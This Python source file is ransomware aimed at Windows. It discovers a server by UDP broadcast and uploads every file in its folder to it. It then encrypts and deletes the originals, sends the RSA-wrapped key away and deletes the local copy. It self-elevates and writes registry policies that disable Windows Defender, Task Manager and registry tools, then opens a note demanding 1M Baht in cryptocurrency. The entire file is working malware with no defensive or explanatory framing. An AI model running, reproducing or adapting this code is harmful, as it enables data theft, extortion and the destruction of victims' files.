import socket
import os
import winreg
import ctypes
import sys
import platform
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.asymmetric import padding as asym_padding
from cryptography.hazmat.primitives.serialization import load_pem_public_key

DISCOVERY_PORT = 9999
PORT = 5001
KEY_FILE = 'master.key'

# DISCOVER : Brodcast Network
def discover_server():
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    udp.settimeout(3)

    targets = ['255.255.255.255', '172.28.255.255',]

    for target in targets:
        udp.sendto(b'FIND_SERVER', (target, DISCOVERY_PORT))

    try:
        data, addr = udp.recvfrom(1024)
        if data == b'SERVER_HERE':
            print(f'Found server: {addr[0]}')
            return addr[0]
    except:
        print('No Server')
        return None

# KEY
def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as f:
        f.write(key)
    return key

def load_key():
    if not os.path.exists(KEY_FILE):
        return generate_key()
    with open(KEY_FILE, 'rb') as f:
        return f.read()
    
def load_public_key():
    base_dir = os.path.dirname(os.path.abspath(__file__))
    pem_path = os.path.join(base_dir, 'public.pem')
    try:
        with open(pem_path, 'rb') as f:
            return load_pem_public_key(f.read())
    except FileNotFoundError:
        print('No public.pem')
        return None

# ENCRYPT
def encrypt_file(filepath, fernet):
    with open(filepath, 'rb') as f:
        data = f.read()

    encrypted = fernet.encrypt(data)

    with open(filepath + '.enc', 'wb') as f:
        f.write(encrypted)

    os.remove(filepath)
    print(f' {filepath} encrypted')

# FILE SCAN
SKIP_DIRS = {'.git', '__pycache__', 'node_modules', '.idea', '.vscode'}
SKIP_FILES = {'.DS_Store'}

def get_all_files(base_dir):
    all_files = []
    for root, dirs, files in os.walk(base_dir):
        dirs[:] = [d for d in dirs if d not in SKIP_DIRS]
        for file in files:
            try:
                full_path = os.path.join(root, file)
                if file == KEY_FILE:
                    continue
                if file.endswith('.enc'):
                    continue
                if file == os.path.basename(__file__):
                    continue
                if file == 'public.pem':
                    continue
                if file in SKIP_FILES:
                    continue
                if file.startswith('.'):
                    continue
                all_files.append(full_path)
            except Exception as e:
                print(f'Skip {file}: {e}')
    return all_files

# SEND
def sendEncrypt():
    HOST = discover_server()
    if not HOST:
        return

    base_dir = os.path.dirname(os.path.abspath(__file__))
    files = get_all_files(base_dir)

    if not files:
        print('No files')
        return
    
    key = load_key()
    fernet = Fernet(key)
    public_key = load_public_key()

    if not public_key:
        return

    s = socket.socket()
    s.settimeout(10)

    try:
        s.connect((HOST, PORT))
        print(f'Connected')

        # FILES
        s.send(b'FILES'.ljust(16))
        s.send(f'{len(files)}'.encode().ljust(16))

        for i, filepath in enumerate(files):
            try:
                filesize = os.path.getsize(filepath)
                rel_path = os.path.relpath(filepath, base_dir)

                header = f'{rel_path}|{filesize}'
                s.send(header.encode().ljust(1024))

                if s.recv(4) != b'SEND':
                    continue

                print(f'\n({i+1}/{len(files)}) {rel_path}')

                with open(filepath, 'rb') as f:
                    while chunk := f.read(4096):
                        s.sendall(chunk)

                if s.recv(8).strip() == b'OK':
                    print('Done')
                    encrypt_file(filepath, fernet)
                else:
                    print('Failed')
            except Exception as e:
                print(f'Skip: {e}')
                s.send(b'SKIP|0'.ljust(1024))
                s.recv(4)
                continue     

        # KEY
        s.send(b'KEY'.ljust(16))

        with open(KEY_FILE, 'rb') as f:
            key_data = f.read()

        encrypted_key = public_key.encrypt(
            key_data,
            asym_padding.OAEP(
                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        filesize = len(encrypted_key)
        header = f'{KEY_FILE}.enc|{filesize}'
        s.send(header.encode().ljust(1024))
        s.sendall(encrypted_key)

        if s.recv(8).strip() == b'OK':
            os.remove(KEY_FILE)
        else:
            print('Key send failed')

    except Exception as e:
        print(f'Error: {e}')

    finally:
        s.close()
    return True

def disable_security_features():
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        is_admin = False

    if not is_admin:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    try:
        defender_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
        rt_path = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
        policy_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"

        key_main = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, defender_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key_main, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key_main)

        key_rt = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, rt_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key_rt, "DisableRealtimeMonitoring", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key_rt, "DisableBehaviorMonitoring", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key_rt, "DisableOnAccessProtection", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key_rt, "DisableScanOnRealtimeEnable", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key_rt)

        key_policy = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, policy_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key_policy, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(key_policy, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key_policy)

    except Exception as e:
        print(f"Error: {e}")

def ransomMsg():
    filename = "GOT HACKED!.txt"

    with open(filename, "w", encoding="utf-8") as file:
        file.write("You've been hacked. Send 1M Baht to this Crypto Account: fdsfjdskjWEJFOJF1235489 then I'll give you the decryptor")

    try:
        if sys.platform == "win32":
            os.startfile(filename)
    except Exception as e:
        print(e)

if __name__ == '__main__':
    disable_security_features()
    if (sendEncrypt()):
        ransomMsg()